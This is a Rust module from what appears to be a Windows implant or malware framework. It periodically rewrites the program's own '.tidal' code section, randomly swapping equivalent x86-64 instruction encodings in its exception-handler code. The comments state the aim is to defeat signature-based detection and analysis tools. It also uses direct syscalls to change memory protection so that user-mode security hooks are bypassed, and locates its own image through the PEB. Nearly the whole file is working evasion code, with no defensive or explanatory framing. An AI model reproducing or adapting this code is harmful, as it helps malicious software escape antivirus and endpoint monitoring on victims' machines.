//! Polymorphic code mutation for the `.tidal` PE section.
//!
//! Periodically swaps semantically equivalent x86-64 instruction sequences
//! within the `.tidal` section, changing the byte pattern of VEH handlers
//! to defeat signature-based detection and pattern matching by analysis tools.
//!
//! ## Safe instruction pairs
//!
//! All swapped pairs produce identical architectural effects:
//! - `xor reg, reg` ↔ `sub reg, reg` — both zero a register and set ZF=1
//! - `mov reg, reg` encoding A ↔ encoding B — x86 has two MOV r64 encodings
//!
//! ## Thread safety
//!
//! The `MUTATING` flag prevents VEH handlers from executing `.tidal` code
//! while it's being patched. VEH handlers spin-wait until mutation completes.

use core::sync::atomic::{AtomicBool, Ordering};

/// Flag: set `true` while the tide thread is patching `.tidal`.
/// VEH handlers spin-wait on this before executing.
pub static MUTATING: AtomicBool = AtomicBool::new(false);

/// 3-byte equivalent instruction pairs (same semantics, different bytes).
///
/// Format: (pattern_a, pattern_b) — both are interchangeable.
const PAIRS_3: [([u8; 3], [u8; 3]); 8] = [
    // xor rax, rax  ↔  sub rax, rax
    ([0x48, 0x31, 0xC0], [0x48, 0x29, 0xC0]),
    // xor rcx, rcx  ↔  sub rcx, rcx
    ([0x48, 0x31, 0xC9], [0x48, 0x29, 0xC9]),
    // xor rdx, rdx  ↔  sub rdx, rdx
    ([0x48, 0x31, 0xD2], [0x48, 0x29, 0xD2]),
    // xor r8, r8    ↔  sub r8, r8
    ([0x4D, 0x31, 0xC0], [0x4D, 0x29, 0xC0]),
    // xor r9, r9    ↔  sub r9, r9
    ([0x4D, 0x31, 0xC9], [0x4D, 0x29, 0xC9]),
    // mov rcx, rax  ↔  mov rcx, rax  (89/C1 vs 8B/C8 encoding)
    ([0x48, 0x89, 0xC1], [0x48, 0x8B, 0xC8]),
    // mov rdx, rax  ↔  mov rdx, rax  (89/C2 vs 8B/D0 encoding)
    ([0x48, 0x89, 0xC2], [0x48, 0x8B, 0xD0]),
    // mov rax, rcx  ↔  mov rax, rcx  (89/C8 vs 8B/C1 encoding)
    ([0x48, 0x89, 0xC8], [0x48, 0x8B, 0xC1]),
];

/// Mutate the `.tidal` section by swapping equivalent instruction sequences.
///
/// Called periodically by the tide thread. Uses direct syscalls for
/// `NtProtectVirtualMemory` to avoid user-mode hooks.
///
/// The function avoids modifying its own code by skipping a ±2KB region
/// around its own address.
///
/// # Safety
///
/// Modifies executable code in the `.tidal` section. Callers must ensure
/// VEH handlers check the `MUTATING` flag before executing.
#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
#[link_section = ".tidal"]
pub unsafe fn mutate_tidal(seed: u64) {
    let (base, size) = find_tidal_section();
    if base == 0 || size < 4 {
        return;
    }

    // Get our own function's approximate address to avoid self-modification.
    // Skip ±2KB around this function to be safe.
    let self_addr = mutate_tidal as *const () as usize;
    let self_start = self_addr.saturating_sub(2048);
    let self_end = self_addr.saturating_add(2048);

    // Also skip around find_tidal_section
    let find_addr = find_tidal_section as *const () as usize;
    let find_start = find_addr.saturating_sub(512);
    let find_end = find_addr.saturating_add(512);

    // Signal VEH handlers to spin-wait
    MUTATING.store(true, Ordering::Release);

    // Make .tidal writable
    let mut old: u32 = 0;
    crate::syscall::nt_protect_virtual_memory(
        base as *mut u8,
        size,
        0x40, // PAGE_EXECUTE_READWRITE
        &mut old,
    );

    // Scan and swap patterns using a simple LCG PRNG for randomization
    let code = core::slice::from_raw_parts_mut(base as *mut u8, size);
    let mut rng = seed;
    let mut i = 0usize;

    while i + 3 <= size {
        let addr = base + i;

        // Skip our own code regions
        if (addr >= self_start && addr < self_end)
            || (addr >= find_start && addr < find_end)
        {
            i += 1;
            continue;
        }

        // Check each pair
        let mut matched = false;
        let mut j = 0usize;
        while j < PAIRS_3.len() {
            let (ref a, ref b) = PAIRS_3[j];

            if code[i] == a[0] && code[i + 1] == a[1] && code[i + 2] == a[2] {
                // LCG step: randomly decide whether to swap (50%)
                rng = rng.wrapping_mul(6364136223846793005).wrapping_add(1442695040888963407);
                if (rng >> 33) & 1 == 0 {
                    code[i] = b[0];
                    code[i + 1] = b[1];
                    code[i + 2] = b[2];
                }
                i += 3;
                matched = true;
                break;
            } else if code[i] == b[0] && code[i + 1] == b[1] && code[i + 2] == b[2] {
                rng = rng.wrapping_mul(6364136223846793005).wrapping_add(1442695040888963407);
                if (rng >> 33) & 1 == 0 {
                    code[i] = a[0];
                    code[i + 1] = a[1];
                    code[i + 2] = a[2];
                }
                i += 3;
                matched = true;
                break;
            }
            j += 1;
        }

        if !matched {
            i += 1;
        }
    }

    // Restore .tidal to RX (no write)
    crate::syscall::nt_protect_virtual_memory(
        base as *mut u8,
        size,
        0x20, // PAGE_EXECUTE_READ
        &mut old,
    );

    // Flush instruction cache
    crate::syscall::nt_flush_instruction_cache(base as *const u8, size);

    // Allow VEH handlers to proceed
    MUTATING.store(false, Ordering::Release);
}

/// Non-Windows stub.
#[cfg(not(all(target_os = "windows", target_arch = "x86_64")))]
pub unsafe fn mutate_tidal(_seed: u64) {}

/// Find the `.tidal` section in the running PE image.
/// Returns (virtual_address, virtual_size).
#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
#[link_section = ".tidal"]
unsafe fn find_tidal_section() -> (usize, usize) {
    let peb: *const u8;
    core::arch::asm!(
        "mov {}, gs:[0x60]",
        out(reg) peb,
        options(nostack, nomem, preserves_flags)
    );
    if peb.is_null() {
        return (0, 0);
    }

    let image_base = *(peb.add(0x10) as *const usize);
    if image_base == 0 {
        return (0, 0);
    }

    let base = image_base as *const u8;

    // DOS → PE offset
    let e_lfanew = *(base.add(0x3C) as *const u32) as usize;
    if *(base.add(e_lfanew) as *const u32) != 0x0000_4550 {
        return (0, 0);
    }

    let coff = base.add(e_lfanew + 4);
    let num_sections = *(coff.add(2) as *const u16) as usize;
    let opt_hdr_size = *(coff.add(16) as *const u16) as usize;
    let sections = coff.add(20 + opt_hdr_size);

    // Scan for ".tidal\0\0" section name
    let mut idx = 0usize;
    while idx < num_sections {
        let sh = sections.add(idx * 40);
        let n = core::slice::from_raw_parts(sh, 8);
        if n[0] == b'.' && n[1] == b't' && n[2] == b'i' && n[3] == b'd'
            && n[4] == b'a' && n[5] == b'l'
        {
            let vsize = *(sh.add(8) as *const u32) as usize;
            let rva = *(sh.add(12) as *const u32) as usize;
            return (image_base + rva, vsize);
        }
        idx += 1;
    }

    (0, 0)
}

// ─── Tests ───────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_pairs_same_length() {
        for (a, b) in &PAIRS_3 {
            assert_eq!(a.len(), b.len());
            assert_eq!(a.len(), 3);
        }
    }

    #[test]
    fn test_pairs_differ() {
        for (a, b) in &PAIRS_3 {
            assert_ne!(a, b, "pair variants must have different bytes");
        }
    }

    #[test]
    fn test_pairs_same_rex_prefix() {
        // All pairs share the same REX prefix byte
        for (a, b) in &PAIRS_3 {
            assert_eq!(a[0], b[0], "REX prefix must match");
        }
    }

    #[test]
    fn test_mutating_flag_default() {
        assert!(!MUTATING.load(Ordering::Relaxed));
    }

    #[test]
    fn test_non_windows_stub_does_nothing() {
        // On non-Windows, mutate_tidal is a no-op
        #[cfg(not(all(target_os = "windows", target_arch = "x86_64")))]
        unsafe {
            mutate_tidal(42);
        }
    }
}
